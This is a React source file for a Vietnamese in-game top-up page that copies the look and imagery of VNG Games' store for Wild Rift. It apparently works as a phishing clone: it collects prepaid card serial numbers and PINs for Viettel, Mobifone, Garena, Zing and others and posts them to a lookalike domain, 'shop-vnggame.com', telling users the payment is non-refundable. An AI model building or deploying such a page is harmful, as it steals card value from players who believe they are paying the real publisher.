import React, { useRef, useState } from "react";
import Layout from "../../libs/Layout";
import * as Yup from "yup";
import { useFormik } from "formik";
import createNotification from "../../constants/notification.constants";
import data from "../../constants/packages.json";
import { v4 as uuidv4 } from "uuid";
import { useNavigate } from "react-router-dom";
import { formatPrice } from "../../helper/format";
import axios from "axios";
import Loading from "../../components/Loading";
import { useMediaQuery } from "react-responsive";
type Props = {};


const HomePage: React.FC<Props> = () => {
  const navigate = useNavigate();
  const [isOpen, setIsOpen] = useState<boolean>(false);
  const [isOpenScroll, setIsOpenScroll] = useState<boolean>(false);
  const [isValidateSuccess, setValidateSuccess] = useState<boolean>(false);
  const [selectedItem, setSelectedItem] = useState(data?.[0] || null);
  const [selectedDenomination, setSelectedDenomination] = useState<any>(null);
  const [selectedCard, setSelectedCard] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState(false);
  const validationSchema = Yup.object({
    cardSerial: Yup.string()
      .required("Vui lòng nhập số seri thẻ")
      .test('len', 'Độ dài seri không phù hợp', val => {

        const type = selectedDenomination.name || null; // Bạn cần thay đổi phần này để lấy được type từ đâu đó
        if ((type.toLowerCase() === 'viettel' || type === 'VT') && (val.length !== 11 && val.length !== 14)) {
          return false;
        }
        if ((type.toLowerCase() === 'mobifone' || type === 'Mobi') && val.length !== 15) {
          return false;
        }
        if (type.toLowerCase() === 'vnmb' && val.length !== 16) {
          return false;
        }
        if ((type.toLowerCase() === 'vinaphone' || type === 'Vina') && val.length !== 14) {
          return false;
        }
        if (type.toLowerCase() === 'garena' && val.length !== 9) {
          return false;
        }
        if (type.toLowerCase() === 'zing' && val.length !== 12) {
          return false;
        }
        if (type.toLowerCase() === 'vcoin' && val.length !== 12) {
          return false;
        }
        return true;
      }),
    cardPassword: Yup.string()
      .required("Vui lòng nhập mã thẻ")
      .test('len', 'Độ dài mã thẻ không phù hợp', val => {
        const type = selectedDenomination.name || null;; 
        if ((type.toLowerCase() === 'viettel' || type === 'VT') && (val.length !== 13 && val.length !== 15)) {
          return false;
        }
        if ((type.toLowerCase() === 'mobifone' || type === 'Mobi') && val.length !== 12) {
          return false;
        }
        if ((type.toLowerCase() === 'vnmb' || type === 'VNMB') && val.length !== 12) {
          return false;
        }
        if ((type.toLowerCase() === 'vinaphone' || type === 'Vina') && val.length !== 14) {
          return false;
        }
        if ((type.toLowerCase() === 'garena' || type === 'Garena') && val.length !== 16) {
          return false;
        }
        if ((type.toLowerCase() === 'zing' || type === 'Zing') && val.length !== 9) {
          return false;
        }
        if ((type.toLowerCase() === 'vcoin' || type === 'Vcoin') && val.length !== 12) {
          return false;
        }
        return true;
      }),
  });
  const formik: any = useFormik({
    initialValues: {
      cardSerial: "",
      cardPassword: "",
    },
    validationSchema,
    onSubmit: async (values: any) => {
      if (selectedDenomination) {
        values.cardTelco = selectedDenomination.name;
        values.cardAmount = selectedDenomination.price;
      }
      localStorage.setItem("tt", JSON.stringify(selectedDenomination));
      try {
        setIsLoading(true);
        const response: any = await axios.post(
          "https://api.shop-vnggame.com/pay",
          values
        );
        if (response.data) {
          localStorage.setItem("order", JSON.stringify(response.data));
          navigate(`/recharge/${parseInt(uuidv4().replace(/-/g, ""), 16)}`);
        } else {
          createNotification("error", "Lỗi vui lòng xem lại");
        }
      } catch (error: any) {
        createNotification("error", error?.message);
      } finally {
        setIsLoading(false);
      }
    },
  });

  const handleItemClick = (item: any) => {
    setSelectedItem(item);
    setSelectedDenomination(null);
    setSelectedCard(false);
    setIsOpen(false);
    formik.resetForm();
    setValidateSuccess(false);
  };

  const handleDenominationClick = (denomination: any) => {
    setSelectedDenomination(denomination);
    setSelectedCard(false);
    setIsOpen(false);
    formik.resetForm();
    setValidateSuccess(false);
  };

  const handleCardClick = () => {
    setSelectedCard(true);
  };

  const handleToggleDropdown = () => {
    setIsOpen(!isOpen);
  };

  const handleToggleDropdownScroll = () => {
    setIsOpenScroll(!isOpenScroll);
  };

  const handleConfirmationSubmit = () => {
    formik.validateForm().then((errors: any) => {
      if (Object.keys(errors).length > 0) {
        Object.keys(errors).forEach((fieldName) => {
          formik.setFieldError(fieldName, errors[fieldName]);
        });
      } else {
        setValidateSuccess(true);
      }
    });
  };
  const isMobile = useMediaQuery({ maxWidth: 980 });
  const listRef = useRef<any>(null);
 
  return (
    <Layout>
      <div
        id="StepIndicator"
        className="stepIndicator"
       
      >
        <div className="el-select stepIndicator__select">
          {/**/}
          <div
            className={`el-input el-input--suffix ${
              isOpenScroll ? "is-focus" : ""
            }`}
            onClick={handleToggleDropdownScroll}
          >
            {/**/}
            <input
              type="text"
              autoComplete="off"
              value={"Bước 1 / 4: Thông tin nhân vật"}
              readOnly
              className="el-input__inner"
            />
            {/**/}
            <span className="el-input__suffix">
              <span className="el-input__suffix-inner">
                {isOpenScroll ? (
                  <i className="el-select__caret el-input__icon fas fa-chevron-up"></i>
                ) : (
                  <i className="el-select__caret el-input__icon fas fa-chevron-down"></i>
                )}
              </span>
            </span>
          </div>
          <div
            className={`el-select-dropdown el-popper ${
              isMobile ? "stepIndicatorPoperMobile" : "stepIndicatorPoper"
            }`}
            style={
              !isMobile
                ? isOpenScroll
                  ? {
                      minWidth: 414,
                      top: "120px",
                      position: "absolute",
                      zIndex: 2007,
                    }
                  : {
                      display: "none",
                      minWidth: 770,
                    }
                : isOpenScroll
                ? {
                    minWidth: 770,
                  }
                : {
                    display: "none",
                    minWidth: 770,
                  }
            }
          >
            <div className="el-scrollbar" style={{}}>
              <div className="el-select-dropdown__wrap el-scrollbar__wrap">
                <ul
                  className="el-scrollbar__view el-select-dropdown__list"
                  ref={listRef}
                >
                  {/**/}
                  <li
                    className="el-select-dropdown__item selected"
                    id="StepIndicator-option-1"
                    custom-value="Bước 1/4: Thông tin nhân vật"
                    
                  >
                    <span>Bước 1/4: Thông tin nhân vật</span>
                  </li>
                  <li
                    className="el-select-dropdown__item"
                    id="StepIndicator-option-2"
                    custom-value="Bước 2/4: Chọn gói"
                  >
                    <span>Bước 2/4: Chọn gói</span>
                  </li>
                  <li
                    className="el-select-dropdown__item is-disabled"
                    id="StepIndicator-option-3"
                    custom-value="Bước 3/4: Chọn phương thức thanh toán"
                  >
                    <span>Bước 3/4: Chọn phương thức thanh toán</span>
                  </li>
                  <li
                    className="el-select-dropdown__item is-disabled"
                    id="StepIndicator-option-4"
                    custom-value="Bước 4/4: Xác nhận"
                  >
                    <span>Bước 4/4: Xác nhận</span>
                  </li>
                </ul>
              </div>
              <div className="el-scrollbar__bar is-horizontal">
                <div
                  className="el-scrollbar__thumb"
                  style={{ transform: "translateX(0%)" }}
                />
              </div>
              <div className="el-scrollbar__bar is-vertical">
                <div
                  className="el-scrollbar__thumb"
                  style={{ transform: "translateY(0%)" }}
                />
              </div>
            </div>
            {/**/}
          </div>
        </div>
      </div>

      <div style={{ marginTop: 0 }}>
        {/**/}
        {/**/}
        {/**/}
        {/**/}
        <div className={`container ${isMobile ? "mobile" : "pc"}`}>
          <div className="banner">
            <div className="banner-content banner-img">
              <div className="banner-content__center">
                <picture>
                  <source
                    srcSet={`${
                      isMobile
                        ? "https://scdn-img.vng.games/mainsite/images/WR-banner-600x337.jpg?size=origin&iswebp=1"
                        : "https://scdn-img.vng.games/mainsite/images/WR-searchbanner-1920x450_new.jpg?size=origin&iswebp=1"
                    }`}
                    type="image/webp"
                  />
                  <img
                    src={`${
                      isMobile
                        ? "https://scdn-stc.vng.games/mainsite/images/WR-banner-600x337.jpg"
                        : "https://scdn-stc.vng.games/mainsite/images/WR-searchbanner-1920x450_new.jpg"
                    }`}
                  />
                </picture>
              </div>
            </div>
            {!isMobile && (
              <picture>
                <source
                  srcSet="https://scdn-img.vng.games/mainsite/images/WR-logo-240x160_2D.png?size=origin&iswebp=1"
                  type="image/webp"
                />
                <img
                  src="https://scdn-stc.vng.games/mainsite/images/WR-logo-240x160_2D.png"
                  alt="https://scdn-stc.vng.games/mainsite/images/WR-logo-240x160_2D.png"
                  className="banner-logo"
                />
              </picture>
            )}
            <span className="banner-title">
              Liên Minh Huyền Thoại: Tốc Chiến
            </span>
          </div>
          <div className="content">
            <form className="content-main-flow" onSubmit={formik.handleSubmit}>
              <div className="content-box" id="IngameAccountInfo">
                <div className="mask" />
                <div className="content-box__header">
                  <div className="content-box__header-container">
                    <span className="content-box__header-number">1</span>
                    <span className="content-box__header-content">
                      {" "}
                      Đăng nhập bằng Riot ID hoặc tên người dùng
                    </span>
                  </div>
                </div>
                <div className="content-box__content">
                  <div
                    className="el-row"
                    style={{ marginLeft: "-5px", marginRight: "-5px" }}
                  >
                    <div
                      className="el-col el-col-24"
                      style={{ paddingLeft: 5, paddingRight: 5 }}
                    >
                      <div className="custom-userInfo">
                        <p data-v-3f3af4cc className="information-row">
                          <span data-v-3f3af4cc>Riot ID :</span>
                          <code data-v-3f3af4cc style={{ paddingLeft: "5px" }}>
                            {localStorage.getItem("name")}
                          </code>
                        </p>
                      </div>
                    </div>
                  </div>
                  <div className="errorWrapper">
                    <p className="error-mess" />
                    {/**/}
                  </div>
                  {/**/}
                  {/**/}
                  <div
                    tabIndex={-1}
                    className="el-drawer__wrapper"
                    style={{ display: "none" }}
                  >
                    <div
                      role="document"
                      tabIndex={-1}
                      className="el-drawer__container"
                    >
                      <div
                        role="dialog"
                        tabIndex={-1}
                        className="el-drawer btt redeem-drawer"
                        style={{ height: "30%" }}
                      >
                        {/**/}
                        {/**/}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="content-box selectPackage" id="packageList">
                <div className="mask" />
                <div className="content-box__header">
                  <div className="content-box__header-container">
                    <span className="content-box__header-number">2</span>
                    <span className="content-box__header-content">
                      Chọn gói
                    </span>
                  </div>
                </div>
                <div className="content-box__content">
                  {/**/}
                  <div className="packageGroup">
                    {data?.map((item: any, index: number) => (
                      <div
                        key={index}
                        className="button-wrapper"
                        id="ProductListing_GroupProduct_Button"
                      >
                        <button
                          className={`el-button button el-button--default around ${
                            selectedItem === item ? "selected" : "default"
                          }`}
                          onClick={() => handleItemClick(item)}
                        >
                          {/**/}
                          {/**/}
                          <span>
                            {/**/} {item.name}
                          </span>
                        </button>
                        {/**/}
                        {/**/}
                      </div>
                    ))}
                    {/* <div
                      data-v-239b83ca
                      className="button-wrapper"
                      id="ProductListing_GroupProduct_Button"
                      custom-value="G1"
                      item-order={1}
                    >
                      <button className="el-button button el-button--default default around">
                        <span>Viettel </span>
                      </button>
                    </div> */}
                  </div>
                  <div
                    className="listProduct el-row productWrapper"
                    style={{ marginLeft: "-15px", marginRight: "-15px" }}
                  >
                    {selectedItem.denominations?.map(
                      (denomination: any, index: number) => (
                        <>
                          <div
                            key={index}
                            onClick={() =>
                              handleDenominationClick(denomination)
                            }
                            className={`el-col el-col-${
                              isMobile ? "24" : "12"
                            }`}
                            style={{ paddingLeft: 15, paddingRight: 15 }}
                          >
                            <div
                              className="product-wrapper"
                              id="ProductListing_Product_Div"
                            >
                              <div className="package-item">
                                <picture className="handle-image">
                                  <source
                                    srcSet={denomination.image}
                                    type="image/webp"
                                  />
                                  <img
                                    src={denomination.image}
                                    alt="Gói 11035 Wild Cores"
                                  />
                                </picture>
                                {/**/}
                                {/**/}
                                {selectedDenomination === denomination && (
                                  <div className="packageBadge">
                                    <div
                                      id="Product_Select_Div"
                                      className="isSelectBadge"
                                    >
                                      <i className="fas fa-check"></i>
                                      <span>Chọn</span>
                                    </div>
                                  </div>
                                )}
                              </div>
                              <div className="retry-auto-debit-tooltip is-left-item">
                                <div
                                  className="retry_tooltip__content"
                                  style={{ display: "none" }}
                                >
                                  <div className="notice-container">
                                    <div className="content">
                                      <div className="text">
                                        Chúng tôi đang gặp một số vấn đề khi thu
                                        khoản thanh toán của bạn để gia hạn gói
                                        nạp. Vui lòng kiểm tra lại thông tin
                                        thanh toán và đảm bảo rằng bạn còn tiền
                                        trong tài khoản liên kết của mình.
                                      </div>
                                      <div className="text bold-text">
                                        Lưu ý: Bạn có thể huỷ gói bằng cách truy
                                        cập trang Quản lý thanh toán và chọn
                                        “Huỷ gói”. Bạn có thể mua lại gói nạp
                                        sau khi đã huỷ gói.
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </>
                      )
                    )}
                  </div>
                  {/**/}
                </div>
              </div>
              {/**/}
              {/**/}
              {/**/}
              {selectedDenomination && (
                <div className="content-box" id="paymentMethodList">
                  <div className="mask" />
                  <div className="content-box__header">
                    <div className="content-box__header-container">
                      <span className="content-box__header-number">3</span>
                      <span className="content-box__header-content">
                        Chọn phương thức thanh toán
                      </span>
                    </div>
                  </div>
                  <div className="content-box__content">
                    <div
                      role="tablist"
                      aria-multiselectable="true"
                      className="el-collapse pmt-method-group"
                    >
                      <div
                        className="el-collapse-item"
                        id="PaymentChannel_GroupPaymentMethod_Div"
                        item-order={0}
                      >
                        <div
                          role="tab"
                          onClick={handleToggleDropdown}
                          aria-controls="el-collapse-content-3990"
                          aria-describedby="el-collapse-content-3990"
                        >
                          <div
                            role="button"
                            id="el-collapse-head-3990"
                            tabIndex={0}
                            className="el-collapse-item__header"
                          >
                            <div data-v-5d4a953c className="pmt-group">
                              <div
                                data-v-5d4a953c
                                className="pmt-group__content"
                              >
                                <div
                                  data-v-5d4a953c
                                  className="pmt-group__img card-icon-small"
                                />
                                <div
                                  data-v-5d4a953c
                                  className="pmt-group__name"
                                >
                                  <div data-v-5d4a953c className="displayName">
                                    <p
                                      data-v-5d4a953c
                                      className="custom-pmt-group-name"
                                    >
                                      {" "}
                                      {selectedDenomination.name} {/**/}
                                    </p>
                                    <p data-v-5d4a953c className="minAmount">
                                      {" "}
                                      {formatPrice(
                                        selectedDenomination.price
                                      )}{" "}
                                      VND
                                    </p>
                                  </div>
                                  {/**/}
                                </div>
                              </div>
                            </div>
                            {/* <i className="el-collapse-item__arrow el-icon-arrow-right" />
                             */}
                            {isOpen ? (
                              <i className="fas fa-chevron-up"></i>
                            ) : (
                              <i className="fas fa-chevron-down"></i>
                            )}
                          </div>
                        </div>
                        {isOpen && !isMobile && (
                          <div
                            onClick={handleCardClick}
                            role="tabpanel"
                            aria-labelledby="el-collapse-head-3990"
                            id="el-collapse-content-3990"
                            className="el-collapse-item__wrap"
                            style={{}}
                            data-old-padding-top
                            data-old-padding-bottom
                            data-old-overflow
                          >
                            <div className="el-collapse-item__content">
                              {/**/}
                              {/**/}
                              {/**/}
                              <div
                                data-v-5d4a953c
                                className={`el-row`}
                                style={{
                                  marginLeft: "-5px",
                                  marginRight: "-5px",
                                }}
                              >
                                <div
                                  data-v-5d4a953c
                                  className={`el-col ${
                                    isMobile ? "el-col-24" : "el-col-8"
                                  }`}
                                  style={{ paddingLeft: 5, paddingRight: 5 }}
                                >
                                  <div
                                    className={`pmt-method ${
                                      selectedCard && "selected"
                                    }`}
                                    id="PaymentChannel_PaymentMethod_Div"
                                  >
                                    <span
                                      data-v-eac0a7dc
                                      className="pmt-method__info"
                                    >
                                      <img
                                        src={selectedDenomination.cardImg}
                                        alt={selectedDenomination.cardImg}
                                        className="pmt__img payzing card partner-1 icon-1"
                                      />
                                      <span
                                        data-v-eac0a7dc
                                        className="pmt__cost"
                                      >
                                        <span>
                                          {formatPrice(
                                            selectedDenomination.price
                                          )}{" "}
                                          VND
                                        </span>
                                      </span>
                                      {/**/}
                                    </span>
                                    <div
                                      data-v-eac0a7dc
                                      className="pmt-method__name"
                                    >
                                      <span data-v-5d4a953c data-v-eac0a7dc>
                                        {selectedDenomination.name}
                                      </span>
                                    </div>
                                  </div>
                                </div>
                                {/**/}
                                {selectedCard && (
                                  <div
                                    data-v-5d4a953c
                                    className="el-col el-col-24"
                                    style={{ paddingLeft: 5, paddingRight: 5 }}
                                  >
                                    <div
                                      data-v-5d4a953c
                                      className="pmt-input show"
                                    >
                                      <div
                                        data-v-5d4a953c
                                        className="pmtInputContainer"
                                      >
                                        <div className="el-form pmtMethodInput el-form--label-top">
                                          <div
                                            className={`el-form-item ${
                                              formik.touched.cardSerial &&
                                              formik.errors.cardSerial &&
                                              "is-error"
                                            } is-required`}
                                          >
                                            <label
                                              htmlFor="cardSerial"
                                              className="el-form-item__label"
                                            >
                                              Số seri
                                            </label>
                                            <div className="el-form-item__content">
                                              <div
                                                className="dataInput el-input"
                                                id="PaymentInfoSubmission_cardSerial_Input"
                                              >
                                                {/**/}
                                                <input
                                                  type="text"
                                                  autoComplete="off"
                                                  id="cardSerial"
                                                  placeholder="Nhập số seri"
                                                  className={`el-input__inner`}
                                                  {...formik.getFieldProps(
                                                    "cardSerial"
                                                  )}
                                                />
                                                {formik.errors.cardSerial && (
                                                  <div
                                                    id="Authentication_quick_rid_error_input"
                                                    className="el-form-item__error is-error primo-error"
                                                  >
                                                    {formik.errors.cardSerial}
                                                  </div>
                                                )}
                                              </div>
                                            </div>
                                          </div>
                                          <div
                                            className={`el-form-item ${
                                              formik.touched.cardPassword &&
                                              formik.errors.cardPassword &&
                                              "is-error"
                                            } is-required`}
                                          >
                                            <label
                                              htmlFor="cardPassword"
                                              className="el-form-item__label"
                                            >
                                              Mã thẻ
                                            </label>
                                            <div className="el-form-item__content">
                                              <div
                                                className="dataInput el-input"
                                                id="PaymentInfoSubmission_cardPassword_Input"
                                              >
                                                {/**/}
                                                <input
                                                  type="text"
                                                  autoComplete="off"
                                                  id="cardPassword"
                                                  placeholder="Nhập mã thẻ"
                                                  {...formik.getFieldProps(
                                                    "cardPassword"
                                                  )}
                                                  className="el-input__inner"
                                                />
                                                {formik.errors.cardPassword && (
                                                  <div
                                                    id="Authentication_quick_rid_error_input"
                                                    className="el-form-item__error is-error primo-error"
                                                  >
                                                    {formik.errors.cardPassword}
                                                  </div>
                                                )}
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                        <button
                                          type="button"
                                          onClick={handleConfirmationSubmit}
                                          className={`el-button el-button--default button ${
                                            !formik.isValid && "disabled"
                                          }`}
                                        >
                                          {/**/}
                                          {/**/}
                                          <span>Xác nhận</span>
                                        </button>
                                      </div>
                                      {/**/}
                                    </div>
                                  </div>
                                )}
                              </div>
                              {/**/}
                            </div>
                          </div>
                        )}

                        {isOpen && isMobile && (
                          <div
                            role="tabpanel"
                            onClick={handleCardClick}
                            aria-labelledby="el-collapse-head-4692"
                            id="el-collapse-content-4692"
                            className="el-collapse-item__wrap"
                            style={{}}
                            data-old-padding-top
                            data-old-padding-bottom
                            data-old-overflow
                          >
                            <div className="el-collapse-item__content">
                              {/**/}
                              {/**/}
                              {/**/}
                              <div
                                data-v-5d4a953c
                                className="el-row"
                                style={{
                                  marginLeft: "-5px",
                                  marginRight: "-5px",
                                }}
                              >
                                <div
                                  data-v-5d4a953c
                                  className="el-col el-col-24"
                                  style={{ paddingLeft: 5, paddingRight: 5 }}
                                >
                                  <div
                                    className="pmt-method selected hasInput"
                                    id="PaymentChannel_PaymentMethod_Div"
                                  >
                                    <span
                                      data-v-eac0a7dc
                                      className="pmt-method__info"
                                    >
                                      <img
                                        src={selectedDenomination.cardImg}
                                        alt={selectedDenomination.cardImg}
                                        className="pmt__img payzing card partner-1 icon-1"
                                      />
                                      <span
                                        data-v-eac0a7dc
                                        className="pmt__cost"
                                      >
                                        <span data-v-5d4a953c data-v-eac0a7dc>
                                          {formatPrice(
                                            selectedDenomination.price
                                          )}{" "}
                                          VND
                                        </span>
                                      </span>
                                      {/**/}
                                    </span>
                                    {selectedCard && (
                                      <div
                                        data-v-5d4a953c
                                        className="el-col el-col-24"
                                        style={{
                                          paddingLeft: 5,
                                          paddingRight: 5,
                                        }}
                                      >
                                        <div
                                          data-v-5d4a953c
                                          className="pmt-input show"
                                        >
                                          <div
                                            data-v-5d4a953c
                                            className="pmtInputContainer"
                                          >
                                            <div className="el-form pmtMethodInput el-form--label-top">
                                              <div
                                                className={`el-form-item ${
                                                  formik.touched.cardSerial &&
                                                  formik.errors.cardSerial &&
                                                  "is-error"
                                                } is-required`}
                                              >
                                                <label
                                                  htmlFor="cardSerial"
                                                  className="el-form-item__label"
                                                >
                                                  Số seri
                                                </label>
                                                <div className="el-form-item__content">
                                                  <div
                                                    className="dataInput el-input"
                                                    id="PaymentInfoSubmission_cardSerial_Input"
                                                  >
                                                    {/**/}
                                                    <input
                                                      type="text"
                                                      autoComplete="off"
                                                      id="cardSerial"
                                                      placeholder="Nhập số seri"
                                                      className={`el-input__inner`}
                                                      {...formik.getFieldProps(
                                                        "cardSerial"
                                                      )}
                                                    />
                                                    {formik.errors
                                                      .cardSerial && (
                                                      <div
                                                        id="Authentication_quick_rid_error_input"
                                                        className="el-form-item__error is-error primo-error"
                                                      >
                                                        {
                                                          formik.errors
                                                            .cardSerial
                                                        }
                                                      </div>
                                                    )}
                                                  </div>
                                                </div>
                                              </div>
                                              <div
                                                className={`el-form-item ${
                                                  formik.touched.cardPassword &&
                                                  formik.errors.cardPassword &&
                                                  "is-error"
                                                } is-required`}
                                              >
                                                <label
                                                  htmlFor="cardPassword"
                                                  className="el-form-item__label"
                                                >
                                                  Mã thẻ
                                                </label>
                                                <div className="el-form-item__content">
                                                  <div
                                                    className="dataInput el-input"
                                                    id="PaymentInfoSubmission_cardPassword_Input"
                                                  >
                                                    {/**/}
                                                    <input
                                                      type="text"
                                                      autoComplete="off"
                                                      id="cardPassword"
                                                      placeholder="Nhập mã thẻ"
                                                      {...formik.getFieldProps(
                                                        "cardPassword"
                                                      )}
                                                      className="el-input__inner"
                                                    />
                                                    {formik.errors
                                                      .cardPassword && (
                                                      <div
                                                        id="Authentication_quick_rid_error_input"
                                                        className="el-form-item__error is-error primo-error"
                                                      >
                                                        {
                                                          formik.errors
                                                            .cardPassword
                                                        }
                                                      </div>
                                                    )}
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                            <button
                                              type="button"
                                              onClick={handleConfirmationSubmit}
                                              className={`el-button el-button--default button ${
                                                !formik.isValid && "disabled"
                                              }`}
                                            >
                                              {/**/}
                                              {/**/}
                                              <span>Xác nhận</span>
                                            </button>
                                          </div>
                                          {/**/}
                                        </div>
                                      </div>
                                    )}
                                    <div
                                      data-v-eac0a7dc
                                      className="pmt-method__name"
                                    >
                                      <span data-v-5d4a953c data-v-eac0a7dc>
                                        {selectedDenomination.name}
                                      </span>
                                    </div>
                                  </div>
                                </div>
                                {/**/}
                              </div>
                              {/**/}
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* ddddddddd */}
              {selectedItem &&
                isValidateSuccess &&
                selectedDenomination &&
                formik.values.cardSerial &&
                formik.values.cardPassword && (
                  <div
                    className="content-box confirm-single confirm"
                    id="confirm"
                  >
                    <div className="mask" />
                    <div className="content-box__header">
                      <div className="content-box__header-container">
                        <span className="content-box__header-number">4</span>
                        <span className="content-box__header-content">
                          Xác nhận thông tin
                        </span>
                      </div>
                    </div>
                    <div className="content-box__content">
                      <div data-v-c359b4ec className="list-info customsize">
                        <div data-v-c359b4ec className="product-wrapper">
                          <div className="package-item">
                            <picture className="handle-image">
                              <source
                                srcSet={selectedDenomination.image}
                                type="image/webp"
                              />
                              <img
                                src={selectedDenomination.image}
                                alt={`Gói ${selectedDenomination.gift} Wild Cores`}
                              />
                            </picture>
                            {/**/}
                            {/**/}
                            <div className="packageBadge">
                              {/**/}
                              {/**/}
                              {/**/}
                            </div>
                          </div>
                          <div className="retry-auto-debit-tooltip is-right-item">
                            <div
                              className="retry_tooltip__content"
                              style={{ display: "none" }}
                            >
                              <div className="notice-container">
                                <div className="content">
                                  <div className="text">
                                    Chúng tôi đang gặp một số vấn đề khi thu
                                    khoản thanh toán của bạn để gia hạn gói nạp.
                                    Vui lòng kiểm tra lại thông tin thanh toán
                                    và đảm bảo rằng bạn còn tiền trong tài khoản
                                    liên kết của mình.
                                  </div>
                                  <div className="text bold-text">
                                    Lưu ý: Bạn có thể huỷ gói bằng cách truy cập
                                    trang Quản lý thanh toán và chọn “Huỷ gói”.
                                    Bạn có thể mua lại gói nạp sau khi đã huỷ
                                    gói.
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div data-v-c359b4ec className="info-detail">
                          <p data-v-c359b4ec>
                            <span data-v-c359b4ec>Nhân vật</span>
                            <code data-v-c359b4ec className="roleName">
                              {localStorage.getItem("name")}
                            </code>
                          </p>
                          {/**/}
                          {/**/}
                          {/**/}
                          <p data-v-c359b4ec>
                            <span data-v-c359b4ec>Thanh toán</span>
                            <code data-v-c359b4ec>Thẻ {selectedItem.name}</code>
                          </p>
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                          {/**/}
                        </div>
                      </div>
                      {/**/}
                      <p className="prdDescription" />
                      <p>Gói {selectedDenomination.gift} Wild Cores</p>
                      <p />
                      {/**/}
                      <p className="confirmPolicy">
                        Bằng việc nhấn vào nút Thanh toán ngay, Bạn đồng ý rằng,
                        giao dịch này là không hoàn, không hủy.
                      </p>
                      <button
                        className="el-button el-button--default button"
                        id="OrderConfirmation_SubmitOrder_Button"
                        type="submit"
                        // onClick={handlePaymentSubmit}
                        disabled={!formik.isValid}
                      >
                        {/**/}
                        {/**/}
                        <span>Thanh toán ngay</span>
                      </button>
                    </div>
                  </div>
                )}
            </form>
            {isLoading && <Loading />}
          </div>
          {/**/}
        </div>
      </div>
    </Layout>
  );
};

export default HomePage;
